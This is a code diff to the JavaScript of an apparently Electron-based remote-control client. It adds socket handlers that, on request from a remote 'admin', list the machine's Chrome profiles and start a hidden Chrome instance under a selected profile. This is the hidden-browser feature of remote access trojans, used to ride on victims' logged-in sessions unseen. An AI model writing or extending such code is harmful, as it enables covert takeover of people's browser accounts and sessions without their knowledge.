@@ -245,11 +245,22 @@ window.onload = async () => {
         });
 
         // Handle Hidden Chrome requests
+        socket.on('request-chrome-profiles', async (adminId) => {
+            try {
+                const profiles = await window.electronAPI.getChromeProfiles();
+                socket.emit('chrome-profiles-list', { adminId, profiles });
+            } catch (e) {
+                console.error("Failed to get chrome profiles", e);
+            }
+        });
+
         let currentAdminForHiddenChrome = null;
-        socket.on('request-hidden-chrome', async (adminId) => {
-            console.log("Admin requested Hidden Chrome");
+        socket.on('request-hidden-chrome', async (data) => {
+            const adminId = data.adminId || data;
+            const profileName = data.profileName;
+            console.log("Admin requested Hidden Chrome", profileName || 'auto');
             currentAdminForHiddenChrome = adminId;
-            const success = await window.electronAPI.startHiddenChrome();
+            const success = await window.electronAPI.startHiddenChrome(profileName);
             if (!success) {
                 socket.emit('client-error', "Failed to start hidden Chrome. Chrome might not be installed.");
             }
